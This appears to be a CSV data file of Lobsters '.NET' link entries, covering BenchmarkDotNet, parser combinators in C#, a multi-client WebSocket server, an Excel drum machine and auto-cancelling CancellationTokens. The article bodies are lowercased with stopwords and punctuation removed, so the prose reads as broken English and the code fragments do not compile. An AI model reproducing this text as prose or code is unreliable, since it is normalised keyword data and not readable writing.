98,Lobsters,dotnet,"C#, F#, .NET programming",BenchmarkDotNet is a powerful .NET library for benchmarking,https://benchmarkdotnet.org/,benchmarkdotnet powerful net library benchmarking,benchmarkdotnet magic reliable precise perfolizer userfriendly project net foundation easy feature simplicity parameterize baseline job console argument net core commandline tool automation managed native disassembly listing reliability friendliness easily customized baseline use benchmarkdotnet dotnetperformance dotnetruntime roslyn mono aspnet core mlnet entity framework core signalr f orleans newtonsoftjson elasticsearchnet dapper expecto accordnet imagesharp ravendb nodatime jint nservicebus serilog autofac npgsql avalonia reactiveui sharpziplib litedb graphql net mediatr tensorflownet apache thrift issue commits file learn benchmarking pro net benchmarking build status contribution welcome contributing guide upforgrabs create new issue code conduct contributor covenant net foundation code conduct,benchmarkdotnet help transform method benchmark track performance share reproducible measurement experiment harder writing unit test hood performs lot magic guarantee reliable precise result thanks perfolizer statistical engine benchmarkdotnet protects popular benchmarking mistake warns something wrong benchmark design obtained measurement result presented userfriendly form highlight important fact experiment library adopted project including net runtime supported net foundation easy start writing benchmark check example copypastable version simplejob baseline true simplejob simplejob simplejob runtimemonikermono rplotexporter public class private private private byte data params public int n globalsetup public void setup data new byte n new random nextbytes data benchmark public byte data benchmark public byte data benchmarkdotnet automatically run benchmark runtimes aggregate measurement print summary table important information oswindows intel core cpu kaby lake cpu logical physical core host net framework ryujit net framework ryujit net core coreclr corefx ryujit net corert commit aot mono mono visual studio method runtime n mean error stddev ratio net u u u net core u u u corert u u u mono u u u net u u u net core u u u corert u u u mono u u u net u u u net core u u u corert u u u mono u u u net u u u net core u u u corert u u u mono u u u measured data exported different format md html csv xml json etc including plot supported runtimes net net framework net core mono corert supported language c f visual basic supported o window linux macos feature benchmarkdotnet ton feature essential comprehensive performance investigation four aspect define design feature simplicity automation reliability friendliness simplicity nt experience performance engineer want write benchmark design complicated performance experiment declarative style using simple apis example want parameterize benchmark mark field property params benchmarkdotnet enumerate specified value run benchmark case want compare benchmark mark one benchmark baseline via benchmark baseline true benchmarkdotnet compare benchmark want compare performance different environment use job example run benchmark net core mono via simplejob simplejob runtimemonikermono nt like attribute call apis via fluent style write code like manualconfigcreateempty configuration benchmark jobdefault adding first job net framework run application jitlegacyjit use legacyjit instead default ryujit withgcserver true use server gc jobdefault adding second job asbaseline marked baseline withenvironmentvariable key value setting environment variable withwarmupcount disable warmup stage prefer commandline experience configure benchmark via console argument console application use net core commandline tool run benchmark dll dotnet benchmark myassemblydll runtimes mono automation reliable benchmark always include lot boilerplate code let think typical case first perform pilot experiment determine best number method invocation next execute several warmup iteration ensure benchmark achieved steady state execute main iteration calculate basic statistic calculate value benchmark use somehow prevent dead code elimination use loop care effect loop unrolling result may depend processor architecture get result check special property obtained performance distribution like multimodality extremely high outlier also evaluate overhead infrastructure deduct result want test several environment perform measurement manually aggregate result write code scratch easy make mistake spoil measurement note shortened version full checklist follow benchmarking lot additional hidden pitfall handled appropriately fortunately nt worry benchmarkdotnet boring timeconsuming stuff moreover library help advanced task may want perform investigation example benchmarkdotnet measure managed native memory traffic print disassembly listing benchmark reliability lot handwritten benchmark produce wrong number lead incorrect business decision benchmarkdotnet protects benchmarking pitfall allows achieving high measurement precision nt worry perfect number method invocation number warmup actual iteration benchmarkdotnet try choose best benchmarking parameter achieve good tradeoff measurement prevision total duration benchmark run nt use magic number like perform iteration library based value statistical metric benchmarkdotnet also prevents benchmarking nonoptimized assembly built using debug mode corresponding result unreliable print warning attached debugger use hypervisor hyperv vmware virtualbox problem current environment year development faced dozen different problem may spoil measurement inside benchmarkdotnet lot heuristic check hack trick help increase reliability result friendliness analysis performance data timeconsuming activity requires attentiveness knowledge experience benchmarkdotnet performs main part analysis present result userfriendly form experiment get summary table contains lot useful data executed benchmark default includes important column easily customized column set adaptive depends benchmark definition measured value example mark one benchmark baseline get additional column help compare benchmark baseline default always show mean column detected vast difference mean median value column presented benchmarkdotnet try find unusual property performance distribution print nice message example warn case multimodal distribution high outlier case scroll result check asciistyle histogram distribution generate beautiful png plot using rplotexporter benchmarkdotnet nt overload data show essential information depending result allows keep summary small primitive case extend complicated case course request additional statistic visualization manually nt customize summary view default presentation much userfriendly possible use benchmarkdotnet everyone benchmarkdotnet already adopted project including dotnetperformance reference benchmark net runtimes dotnetruntime net core runtime library roslyn c visual basic compiler mono aspnet core mlnet entity framework core signalr f orleans newtonsoftjson elasticsearchnet dapper expecto accordnet imagesharp ravendb nodatime jint nservicebus serilog autofac npgsql avalonia reactiveui sharpziplib litedb graphql net mediatr tensorflownet apache thrift github find issue commits file involve benchmarkdotnet learn benchmarking benchmarkdotnet silver bullet magically make benchmark correct analyzes measurement even use library still know design benchmark experiment make correct conclusion based raw data want know benchmarking methodology good practice recommended read book andrey akinshin benchmarkdotnet project lead pro net benchmarking use indepth guide correctly design benchmark measure key performance metric net application analyze result book present dozen case study help understand complicated benchmarking topic avoid common pitfall control accuracy measurement improve performance software build status build server platform build status azure pipeline window azure pipeline ubuntu azure pipeline macos appveyor window travis linux travis macos contribution welcome benchmarkdotnet already stable fullfeatured library allows performing performance investigation professional level continues evolve add new feature time many new cool idea help appreciated develop new feature fix bug improve documentation cool stuff want contribute check contributing guide upforgrabs issue new idea want complain bug feel free create new issue let build best tool benchmarking together code conduct project adopted code conduct defined contributor covenant clarify expected behavior community information see net foundation code conduct
99,Lobsters,dotnet,"C#, F#, .NET programming",A Practical Guide to State Machines,https://deniskyashif.com/a-practical-guide-to-state-machines/,practical guide state machine,http,http
100,Lobsters,dotnet,"C#, F#, .NET programming",Monadic parser combinators in C#,https://tyrrrz.me/blog/monadic-parser-combinators,monadic parser combinators c,discordchatexporter parser formal grammar chomsky hierarchy parsed using regular expression parser combinators json processor using parser combinators sprache wrapping ltgt parsing c superpower pidgin parsley fparsec f,concept parsing always seemed complicated thought work area access secret knowledge brought alien race something along line ago implement proper markdown parsing discordchatexporter could replace ineffective regular expression using idea approach problem spent day researching eventually learning parser combinators concept introduced whole new paradigm writing parser actually make fun enjoyable experience article try give brief highlevel overview parser constitutes formal language scope parser combinators show easy build parser also write working json processor exercise parser sure people word parser new parsing thing time either directly like intparse xelementparse indirectly deserializing http response reading application setting etc parser general sense word human gifted lot innate ability one ability subconsciously deconstruct text logical component quite important skill let u detect pattern analyze semantics compare different snippet text instance see sort logical structure look easily tell number made several component digit thousand separator space digit decimal separator digit obvious reason computer inherently detect pattern like see seemingly random sequence byte dealing text need way analyze essentially need programmatically produce set syntactic component able see naturally new syntacticcomponents new numericliteralcomponent new thousandsseparatorcomponent new numericliteralcomponent new decimalseparatorcomponent new numericliteralcomponent parser take input usually form text formalize using domain object case invalid input parser reject informative error message input parser x domain object error message course fairly basic example much complicated language input generally speaking say parser piece code help build syntactic structure input text effectively helping computer understand whether input considered valid decided set grammar rule effectively define structure language formal grammar parsing number rocket science reading article everyone write quick regular expression split text like syntactic component speaking regular expression know called regular area computer science called formal language theory specifically deal language essentially set abstraction help u understand language formal standpoint formal language build mainly upon concept grammar set rule dictate produce valid symbol given language talk valid invalid input refer grammar based complexity rule grammar separated different type according chomsky hierarchy lowest level find two common grammar type regular contextfree grammar contextfree grammar regular grammar main difference two rule regular grammar unlike contextfree recursive recursive grammar rule one produce symbol evaluated rule html good example contextfree language element html contain element turn contain element also inherently parsed using regular expression result input adheres regular grammar represented using sequence syntactic component contextfree grammar represented using higherlevel structure syntax tree html document body head main footer div p title use regular expression build syntax tree parser combinators many approach writing parser contextfree language language tool know built either manual loopstack parser parser generator framework parser combinators parser combinators concept revolves around representing parser modular function take input produce either successful result error f input result inputremainder error parser transformed combined form complex parser wrapping function another function generally speaking combinators another class function take parser function produce intricate one idea start writing parser simplest grammar rule language gradually move hierarchy using different combinators going level level eventually reach topmost node represents socalled start symbol might abstract understand look practical example json processor using parser combinators better understand approach let write functional json parser using c library called sprache library provides set base lowlevel parser method combine essentially building block use make complex parser start created project defined class represent different entity json grammar total jsonobject jsonarray jsonstring jsonnumber jsonboolean jsonnull corresponding code condensed one snippet brevity public abstract class jsonentity public virtual jsonentity string name throw new invalidoperationexception gettype name nt support operation public virtual jsonentity int index throw new invalidoperationexception gettype name nt support operation public virtual getvalue throw new invalidoperationexception gettype name nt support operation public static jsonentity parse string json throw new notimplementedexception implemented yet public class jsonobject jsonentity public ireadonlydictionary string jsonentity property get public jsonobject ireadonlydictionary string jsonentity property property property public override jsonentity string name propertiestrygetvalue name var result result null public class jsonarray jsonentity public ireadonlylist jsonentity child get public jsonarray ireadonlylist jsonentity child child child public override jsonentity int index childrenelementatordefault index public abstract class jsonliteral tvalue jsonentity public tvalue value get protected jsonliteral tvalue value value value public override getvalue convertchangetype value typeof public class jsonstring jsonliteral string public jsonstring string value base value public class jsonnumber jsonliteral double public jsonnumber double value base value public class jsonboolean jsonliteral bool public jsonboolean bool value base value public class jsonnull jsonliteral object public jsonnull base null see json type inherit jsonentity class defines virtual method method throw exception default overridden proper implementation type support using jsonentityparse able convert piece json text domain object traverse whole hierarchy using indexer var price jsonentityparse json order item price getvalue double course work yet parse method implemented let fix start downloading sprache library nuget create new internal static class named jsongrammar define grammar language internal static class jsongrammar explained approach building simple independent parser first slowly working way hierarchy reason make sense start simplest entity jsonnull one value internal static class jsongrammar private static readonly parser jsonnull jsonnull parsestring null return new jsonnull let quickly look wrote right hand side equal sign calling parsestring create basic parser look sequence character make string null method produce delegate type parser ienumerable char since particularly interested sequence character chain return extension method let u specify concrete object return instead also change delegate type parser jsonnull worth noting write parsing actually happens yet building delegate later invoked parse particular input call jsonnullparse null return object type jsonnull try call input throw exception detailed error pretty cool although particularly useful yet let move jsonboolean type unlike jsonnull actually two potential state true false handle two separate parser internal static class jsongrammar private static readonly parser jsonboolean truejsonboolean parsestring true return new jsonboolean true private static readonly parser jsonboolean falsejsonboolean parsestring false return new jsonboolean false work similarly previous parser wrote except two different parser one entity probably guessed combinators come play merge two parser one using combinator like internal static class jsongrammar private static readonly parser jsonboolean truejsonboolean parsestring true return new jsonboolean true private static readonly parser jsonboolean falsejsonboolean parsestring false return new jsonboolean false private static readonly parser jsonboolean jsonboolean truejsonbooleanor falsejsonboolean combinator extension method take two parser type produce new parser succeeds either one succeeds mean try call jsonbooleanparse true get jsonboolean value equal true similarly call jsonbooleanparse false get jsonboolean whose value false course unexpected input result error one coolest thing using parser combinators expressive code read quite literally fact jsonboolean either truejsonboolean falsejsonboolean truejsonboolean string true produce jsonboolean whose value true falsejsonboolean string false produce jsonboolean whose value false reading code like make really easy infer structure text trying parse let handle next data type jsonnumber internal static class jsongrammar private static readonly parser jsonnumber jsonnumber parsedecimalinvariant select doubleparse cultureinfoinvariantculture select v new jsonnumber v see sprache already provides parsedecimalinvariant box use match number since return parser string par text represents number need transform double first jsonnumber object select method work quite similarly linq select lazily transforms underlying value container different shape let u map raw character sequence complex higherlevel domain object way type select operation colloquially known map operation called functors see limited collection ie ienumerable also container single value like parser way let proceed jsonstring internal static class jsongrammar private static readonly parser jsonstring jsonstring open parsechar value parsecharexcept many text close parsechar select new jsonstring value see combined three consecutive parser one use linq comprehension syntax probably familiar syntax working collection bit different line beginning represents separate parser produce value specify name value left define actual parser right reduce parameter single result terminate select statement construct object want work chaining statement internally call selectmany extension method author library defined work parser oh type let selectmany also known flat map call monad parser wrote try match double quote followed possibly empty sequence character contain double quote terminated another double quote ultimately returning jsonstring object text inside moving first nonprimitive type jsonarray internal static class jsongrammar private static readonly parser jsonarray jsonarray open parsechar child jsonentitytoken delimitedby parsechar close parsechar select new jsonarray childrentoarray structurally json array sequence entity separated comma contained within pair square bracket define using delimitedby combinator try match first parser repeatedly separated second one notice combinator take parsechar instead simply could actually used complicated parser place one even return char string power parser combinators gradually moving structure data working parser increasingly higher order followed step closely probably noticed code actually compile referencing jsonentity parser defined yet grammar rule recursive array contain entity among thing array well contain entity array get point temporary solution define dummy place jsonentity make compile internal static class jsongrammar private static readonly parser jsonarray jsonarray open parsechar child jsonentitytoken delimitedby parsechar close parsechar select new jsonarray childrentoarray public static readonly parser jsonentity jsonentity null also notice token extension method wrap parser higherorder parser consumes whitespace immediately around input know json ignores whitespace unless within double quote need account parser return error encounter whitespace parsing jsonobject similar except contains property instead raw entity start parser first internal static class jsongrammar private static readonly parser keyvaluepair string jsonentity jsonproperty name jsonstringselect svalue colon parsechar token value jsonentity select new keyvaluepair string jsonentity name value private static readonly parser jsonobject jsonobject open parsechar property jsonpropertytoken delimitedby parsechar close parsechar select new jsonobject propertiestodictionary p pkey p pvalue since model implement jsonobject using dictionary individual property expressed using keyvaluepair string jsonentity name property string value jsonentity see used linq comprehension syntax combine sequential parser jsonproperty made jsonstring name colon jsonentity denotes value use select jsonstring lazily extract raw string value interested object jsonobject parser pretty much wrote code jsonarray replacing square bracket curly brace jsonentity jsonproperty finally finished individual entity type properly define jsonentity combining parser wrote earlier internal static class jsongrammar public static readonly parser jsonentity jsonentity jsonobject jsonentity jsonarray jsonstring jsonnumber jsonboolean jsonnull update static method jsonentity class call corresponding parser public abstract class jsonentity public static jsonentity parse string json jsongrammarjsonentityparse json working json processor call jsonentityparse valid json text transform domain ie tree jsonentity object wrapping parsing daunting unapproachable task functional programming help u model complex grammar composition smaller function fairly easy reason luckily c well still thirsty knowledge want see slightly complex example check ltgt html processor cs selector originally written using sprache wish learn parsing general recommend reading parsing c article gabriele tomassetti also monadic parser combinator library net check notably superpower pidgin parsley fparsec f article largely based talk net fest monadic parser combinators c find original presentation full source code json parser
101,Lobsters,dotnet,"C#, F#, .NET programming",A Simple Multi-Client WebSocket Server,https://mcguirev10.com/2019/01/15/simple-multi-client-websocket-server.html,simple multiclient websocket server,update close websocket correctly minimal fullfeature kestrel websocket server namedpipesexample websocketexample realistic functionality blogged code guy httplistener echo echo echo documentation update close websocket correctly http qualifies upgrade discard websocket processing loop update close websocket correctly clientwebsocket beyond echo websocket thread safety exercise reader catching websocketexception web socket security concurrent collection usage useful stuff conclusion,learn simple websocket server realistic feature update github code article updated result newer august article close websocket correctly minimal fullfeature kestrel websocket server old day dumping debug information console disparagingly referred printf debugging output character mode screen talking really old day trashing everything debug output kind sloppy regardless crusty old c programmer might think day make heavy use approach recently ran scenario would handy multiple console surprised discover window support even willing pinvoke call api lot way accomplish similar result course data minimal stash list string dump file heavyweight requirement could go extreme use plugin logger like serilog old habit die hard wanted live consolestyle output next best thing send output another process consolebyproxy back done interprocess communication using window named pipe feature touched since introduced ten year ago net seemed like reasonable place start since already experience belt unfortunately forgotten clumsy suffice say satisfied result article websockets instead named pipe thing say named pipe burning desire mess around namedpipesexample github repo probably good place start websockets kind old news point named pipe positively ancient spite around quite awhile surprised lack functional example plenty code work example never seem anything realistic fashion infrequently opposite problem applies want example source fullblown productionquality application write kind code compiles run useful stuff name game apparently striking balance writing sample code difficult seems dig mention code article found websocketexample repository github realistic functionality probably best websocket example found online microsoft paul batum back blogged accompanied code included decent comment unique sidebyside presentation project present loosely based code clear saying bad example fact guy liked much appears straightup hijacked code article topic suffers problem mentioned work clear turn something useful worst part making useful pretty easy common websocket demo echo server anything server receives sent back client paul example worked way two example present particularly useful except cover send receive end pipe every example found major limitation server could handle single client example even much server could handle single receiveecho cycle small handful additional code task management easy create echo server handle large number simultaneous client even realistic see websocket connection established servicing loop isolated separate task real program simple echo operation implies communication world outside task loop thus github repository contains two sample project websocketexample basic multiclient echo server websocketwithbroadcast echo server outer main loop also periodically broadcast server time connected websocket client two project differ every example found couple interesting way term problem originally trying solve quickly realized websocket server running simple htmljs client might superior dedicated consolebased websocket client app j done good job making websockets ridiculously easy use since initial connection websocket httpbased process called upgrading http connection separate new websocket connection also meant demo server could deliver basic htmljs client app effectively server client wrapped one course nothing prevents writing standalone websocket client app dataexchange need complex dump console streaming big difference basic design controlflow code none example found able cleanly handle shutdown process http side system based upon httplistener class includes start stop method yet none example allowed clean use stop easy accomodate relatively minor adjustment overall application structure course since using net modern async task feature still rather primitive net paul published example want full cancellation support maximize control process something take extra line code realize echo echo echo start basic echo server shown websocketexample project mentioned run server point many browser instance http want establish separate websocket channel back echo server project serf simple htmljs page text input box button send disconnect web page hardcoded string constant sake simplicity main loop surprisingly simple call server start method watching keystroke end program call stop method real application course probably additional configurationreading code plus setting actuallyuseful stuff program need websocket communication first place websockets really simple term managing outside static void main string args try websocketserverstart http consolewriteline press key exit n consolereadkey true websocketserverstop catch operationcanceledexception normal task canceled ignore consolewriteline program ending press key consolereadkey true also capture operationcanceledexception general form taskspecific taskcanceledexception commonly thrown asynchronous operation canceled cancellation token structure threadsafe way signal async process wind whatever exit typically done periodically looping checking iscancellationrequested property token passed async method since get ugly pepper code many nested ifchecks token also includes method called throwifcancellationrequested exactly name suggests end task immediately throwing exception see empty catch several place example interesting code websocketserver class much care static class method simple example see overwhelming reason add extra line code support instancing application need single httplistener also argues static approach bind multiple instance class uri four method needed complete correct echo server start stop selfexplanatory listen implement http portion process processwebsocket loop new websocket client long connection remains open also use static field single instance httplistener used start stop listen cancellationtokensource well cancellationtoken stored class level allows method watch cancellation request cancellation finally integer named socketcounter incremented whenever new connection established act unique id websocket processing loop theory want somehow throttle number active connection sake demonstration important aspnet documented supporting concurrent websocket connection example certainly lightweight stack start method accepts uri prefix refer documentation information formatted warning secure usage notice wrap listen method call separate async task store task handle definitely want await loop indefinitely listenerislistening check probably unnecessary since startup issue seem throw exception public static void start string uriprefix tokensource new cancellationtokensource token tokensourcetoken listener new httplistener listenerprefixesadd uriprefix listenerstart listenerislistening consolewriteline connect browser basic echoback web page consolewriteline server listening uriprefix listen separate thread listenerstop interrupt getcontextasync taskrun listen configureawait false else consolewriteline server failed start stop method even simpler piece puzzle example missing cleanly terminate httplistener started listening discus momentarily also see invoking cancel method cancellation token disposing token source stephen cleary net world grand master threading pointed dispose much probably necessary long token source waithandle used almost never used figure harm either public static void stop listener islistening false tokensourcecancel consolewriteline nserver stopping listenerstop listenerclose tokensourcedispose update see newer followup article close websocket correctly explanation problem stop method http qualifies upgrade get good stuff listen method process http portion pipeline start method executes listen separate async task first glance code controlled usual tokentesting loop private static async task listen tokeniscancellationrequested httplistenercontext context await listenergetcontextasync todo requestprocessing however unlike async method httplistenergetcontextasync accept cancellation token able find explanation key terminating listener httplistenerstop method meant earlier needing different application structure find websocket example internet allow clean termination let app end apparently assuming net process teardown right thing idea anyone raw socket programming experience tell easier mess socket management get right course even difficult right way see request arrives httplistenercontext object provides access important detail http header capable recognizing request want upgrade http connection new websocket connection exposed via iswebsocketreqest property private static async task listen tokeniscancellationrequested httplistenercontext context await listenergetcontextasync contextrequestiswebsocketrequest todo set websocket related communication else todo regular http activites go start looking regular http portion method since browserbased demo client initially connects server example simply respond nonwebsocket request http error however trivial recognize request accepts html page serve something useful httplistenercontext object look familiar anyone worked aspnet http context data simple matter converting html byte array setting response header http status code streaming result back client important call responseclose client wait forever end transmission case html literalstring constant stored class obviously real application would probably send file perhaps even multiple file event request support html respond http bad request error private static async task listen tokeniscancellationrequested httplistenercontext context await listenergetcontextasync contextrequestiswebsocketrequest todo set websocket related communication else contextrequestaccepttypescontains texthtml readonlymemory byte htmlpage new readonlymemory byte html contextresponsecontenttype texthtml contextresponsestatuscode contextresponsestatusdescription ok htmlpagelength await contextresponseoutputstreamwriteasync htmlpage token await contextresponseoutputstreamflushasync token else contextresponsestatuscode contextresponseclose finally add code upgrade connection websocket kick processing loop acceptwebsocketasync method another case cancellation token used found evidence common source trouble although find one discussion engaged complex threading gymnastics make one call cancellable linked convinced managed achieve goal suffice say simple fairly lowlevel operation likely hang long enough require cancellation although real app better exception handling snippet completes block shown followed detailed discussion httplistenerwebsocketcontext wscontext null try wscontext await contextacceptwebsocketasync subprotocol null int socketid interlockedincrement ref socketcounter consolewriteline socket socketid new connection taskrun processwebsocket wscontext socketid configureawait false catch exception server error upgrade http websocket fails contextresponsestatuscode contextresponseclose return acceptwebsocketasync return different type websocketspecific context notice subprotocol null argument subprotocol applicationspecific feature meant control client server communicate websocket established sub protocol websockets real protocol client list subprotocols support parameter notifies client protocol chosen server example might text json although appears subprotocols widelyused feature also use threadsafe interlocked class increment websocket counter result unique id new websocket create particular example id used output purpose websocketwithbroadcasts example talk shortly play important role finally websocket context data socket id handed websocket processing loop processwebsocket method wrapped asynchronous task leading underscoreassingment syntax discard added version c language mean care return value since assignment roslyn complain awaited stored task websocket processing loop point ready actually work websocket connection code set buffer loop long websocket open cancellation token cancelled unlike httporiented method websocket method accept cancellation token code discus aspect feature working websockets private static async task processwebsocket httplistenerwebsocketcontext context int socketid var socket contextwebsocket try byte buffer new byte socketstate websocketstateopen tokeniscancellationrequested websocketreceiveresult receiveresult await socketreceiveasync new arraysegment byte buffer token consolewriteline socket socketid received receiveresultmessagetype frame receiveresultcount byte receiveresultmessagetype websocketmessagetypeclose consolewriteline socket socketid closing websocket await socketcloseasync websocketclosestatusnormalclosure token else consolewriteline socket socketid echoing data await socketsendasync new arraysegment byte buffer receiveresultcount receiveresultmessagetype receiveresultendofmessage token catch operationcanceledexception normal upon tasktoken cancellation disregard catch exception ex consolewriteline nsocket socketid exception exgettype name exmessage exinnerexception null consolewriteline socket socketid inner exception exinnerexceptiongettype name exinnerexceptionmessage finally socket dispose websockets exchange data chunk called frame sideeffect closely related concept raw tcpip socket example creates buffer incoming data exceeds another chunk follow entire message completed obviously simple echo server likely problem depending realworld scenario keep possibility mind tell much data message sender sends endofmessage flag last frame sender server client usage scenario streaming video many never send endofmessage frame three websocketmesagetype value possible text binary close close message really request indicator websocket closing normally want respond another close operation side nothing else release resource case server code also change state one closing value terminate loop complete task update see newer followup article close websocket correctly indepth look close handshake supposed work example process text payload although binary possible client difference may important case j client text message result simple string value whereas binary message produce javascript blob object since echo server turn around send exact buffer back client address outbound buffer setup get broadcast example notice websocket object disposed finally block although lightweight websockets involve unmanaged resource done purely foundational standpoint correctly need know work websockets net want write client websocket application clientwebsocket class available basically wrap lot functionality pretty easy use able apply async task technique keep application responsive beyond echo example called websocketwithbroadcasts echo server one key difference main program loop periodically broadcast message case server timestamp connected websocket client strictly speaking websocket problem communication across task boundary however expose important consideration need accomodate build real websocket server earlier example saw processwebsocket method little world looping echoing websocket closed easy see communicate walled garden example main outer program get little interesting start stop server fashion instead blocking indefinitely waiting keystroke added simple loop call new websocketserverbroadcast message every second const int broadcastintervalsec static void main string args try websocketserverstart http consolewriteline press key exit n datetimeoffset nextmessage datetimeoffsetnowaddseconds broadcastintervalsec consolekeyavailable datetimeoffsetnow nextmessage nextmessage datetimeoffsetnowaddseconds broadcastintervalsec websocketserverbroadcast server time datetimeoffsetnowtostring websocketserverstop catch operationcanceledexception normal upon tasktoken cancellation disregard consolewriteline program ending press key consolereadkey true inside websocketserver class start stop httporiented listen method identical shown previously basic echo server however find new using systemcollectionsconcurrent statement beginning new static field defined dictionary key corresponds active socket id blockingcollection wrap default concurrentqueue store broadcast message active socket private static concurrentdictionary int blockingcollection string broadcastqueues new concurrentdictionary int blockingcollection string intricacy class beyond scope article learn suffice say concurrentdictionary threadsafe dictionary work much like normal dictionary blockingcollection threadsafe wrapper around fifo queue collection creating threadsafe dictionary keyed integer whose value stringbased queue comment explains key websocket id queued string broadcast message threadsafe class ensure main loop safely add value message queue websocket processing loop safely read value queue even though two loop directly synchronizing access requirement one another process adding new broadcast message simple since dictionary keyed websocket id integer new broadcast method loop active websockets enqueues message public static void broadcast string message consolewriteline broadcast message foreach var kvp broadcastqueues kvpvalueadd message address messaging using websocketspecific queue rather single message field visible everyone reasonably possible determine given websocket task available process new message websocket processing loop read message queue saw previous example must await receiveasync handle inbound websocket traffic var receiveresult await socketreceiveasync new arraysegment byte buffer token waiting data client arbitrarily send something connection first attempt solve stop using shared token create local cancellation token source selfcanceled short interval one cancellationtokensource constructor accepts millisecond argument work cancelling token cause websocket automatically close worse way enclosing processwebsocket method could respond timeout catch operationcanceledexception great place add bunch code check message queue send whatever may find correct answer course monitor message queue using another task soon processwebsocket obtains websocket reference context executes three new line code set queueprocessing loop creates new queue dictionary keyed websocket unique id creates new cancellation token processwebsocket terminate new task kick watchforbroadcasts method separate async operation finally block cancel child task token try remove websocket queue dictionary new code added processwebsocket startup broadcastqueuestryadd socketid new blockingcollection string var broadcasttokensource new cancellationtokensource taskrun watchforbroadcasts socketid socket broadcasttokensourcetoken later finally block broadcasttokensource cancel broadcasttokensource dispose broadcastqueues tryremove socketid point move new watchforbroadcasts method private const int broadcastwakeupinterval millisecond private static async task watchforbroadcasts int socketid websocket socket cancellationtoken sockettoken tokeniscancellationrequested try await taskdelay broadcastwakeupinterval sockettoken sockettokeniscancellationrequested broadcastqueues socketid trytake var message consolewriteline socket socketid sending queue var msgbuf new arraysegment byte message await socketsendasync msgbuf websocketmessagetypetext endofmessage true sockettoken catch operationcanceledexception normal upon tasktoken cancellation disregard catch exception ex consolewriteline nsocket socketid broadcast task n exception exgettype name exmessage exinnerexception null consolewriteline inner exception exinnerexceptiongettype name exinnerexceptionmessage pretty simple loop understand watch token canceled remember token created controlled processwebsocket parent task hence variable name sockettoken reminder classlevel token used pas delay awhile try grab new message queue owned web socket delay give main loop chance update queue new broadcast message without repeatedly hammering trytake method new request would probably keep queue busy broadcast method add call would fail message successfully obtained queue use typical call convert byte array arraysegment byte object required websocket sendasync message send client take websocket thread safety still couple hidden gotchas second example rather surprisingly probably interest maximizing performance websockets threadsafe documentation state safe concurrent receiveasync sendasync operation progress one two concurent sendasync call websocket apparently cause trouble fortunately already built solution problem dictionary queue earlier echo server simply called sendasync whatever received broadcast demo convert buffer string add back websocket queue allowing queueprocessing loop send back client old echo code processwebsocket looked like consolewriteline socket socketid echoing data await socketsendasync new arraysegment byte buffer receiveresultcount receiveresultmessagetype receiveresultendofmessage token broadcast version server becomes consolewriteline socket socketid echoing data queue string message buffer receiveresultcount broadcastqueues socketid add message wait turn closing websocket specialcase usage sendasync part ifelse block processwebsocket method old code looked like consolewriteline socket socketid closing websocket await socketcloseasync websocketclosestatusnormalclosure token threadingfriendly version need two additional statement one cancel token control queueprocessing task remove websocket queue dictionary safe proceed normal closeasync call consolewriteline socket socketid closing websocket broadcasttokensourcecancel broadcastqueuestryremove socketid await socketcloseasync websocketclosestatusnormalclosure token exercise reader start working real websockets application couple thing want keep mind catching websocketexception example missing one exception handler definitely implement websocketexception thrown whenever networklevel error seems like unnecessary distraction purpose sample code particular want inspect websocketerrorcode property return websocketerror enumeration describing went wrong web socket security like http web server websocket server must secured broad topic welldocumented internet point rehashing way guidance plan run w protocol name websocket using ssltls encryption also research crosssite vulnerability websockets adhere sameorigin policy used browser although header present want add cors whitelisting check sadly little difficult find information also assume running aspnet handy link share current requirement localnetworkbased really need though read enough know nonaspnet information available dig concurrent collection usage stated earlier detail using class like concurrentdictionary really point article couple thing aware research proper use class trying use real project example broadcast method completely normallooking foreach loop websocket queue happens request arrives new websocket created loop answer new websocket get message foreach loop iterates snapshot dictionary time loop started general want consider handle collision timeouts code need read change content collection blockingcollection class particular interesting timingbased feature available useful stuff broadcasting message every connected client terribly useful make easytounderstand demonstration fact websocket unique id mean server could communicate individual client different way depending need app moreover exact pattern work opposite direction data received websocket client dispatched handling elsewhere server use threadsafe collection even though websockets turn easy use still relatively lowlevel approach communication fair amount planning required ensure server client share common dataexchange syntax also keep mind websockets relatively cheap term resource idle socket us almost resource instead messing around complicated data scheme consider opening multiple websockets dedicated different task use subprotocols would probably come play conclusion excursion websockets began search multiconsole solution wound multiple browser window instead end result flexible scalable anything originally mind sometimes pay follow technology lead example help anyone understand build productionquality websocket server project sample code wish someone written started working websockets day ago clear simple code work realistic way readily adapted useful functionality five six method around line code get job done
102,Lobsters,dotnet,"C#, F#, .NET programming",I made an actual Drum Machine in Excel,https://www.youtube.com/watch?v=To2JIXGoYzA,made actual drum machine excel,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature made actual drum machine excel youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature made actual drum machine excel youtube
104,Lobsters,dotnet,"C#, F#, .NET programming",The Auto-cancelling CancellationToken that Doesn’t,https://tortugatech.wordpress.com/2019/11/01/the-auto-cancelling-cancellationtoken-that-doesnt/,autocancelling cancellationtoken,memory leak disposing cancellationtokensource proposed solution threading timer garbage collected unexpectedly proposed solution tortuga anchor like published,obvious way create cancellationtoken automatically cancel create cancellationtokensource delay example using var c new cancellationtokensource timeout var ct cstoken await listwhenall ct work fine long able hold onto reference cancellationtokensource wanted run something background using var c new cancellationtokensource timeout var ct cstoken taskrun somethinglongrunning ct got problem cancellationtokensource going die soon reach end block timeout reached well bad internal timer callback going ignored token never cancel could remove using block cancellationtokensource never going disposed putting pressure finalizer clear mess specifically safehandle used manualresetevent used cancellationtokensource worse people report memory leak disposing cancellationtokensource proposed solution rather using internal timer cancellationtokensource create external timer timer handle cleanup duty public static cancellationtoken autocancelingtoken timespan delay delaytotalmilliseconds throw new argumentoutofrangeexception nameof delay delay nameof delay le var ct new cancellationtokensource var new systemtimerstimer delaytotalmilliseconds tautoreset false telapsed source e ctscancel ctsdispose tdispose tstart return ctstoken note explicitly using systemtimerstimer instead systemthreadingtimer important threading timer garbage collected unexpectedly proposed solution turn little trick cancellationtoken aware register callback token canceled cancel original cancellationtokensource public static cancellationtoken autocancelingtoken timespan delay delaytotalmilliseconds throw new argumentoutofrangeexception nameof delay delay nameof delay le var ct new cancellationtokensource delay var result ctstoken resultregister ctsdispose return result autocancelingtoken included tortuga anchor steal code like like loading related published november
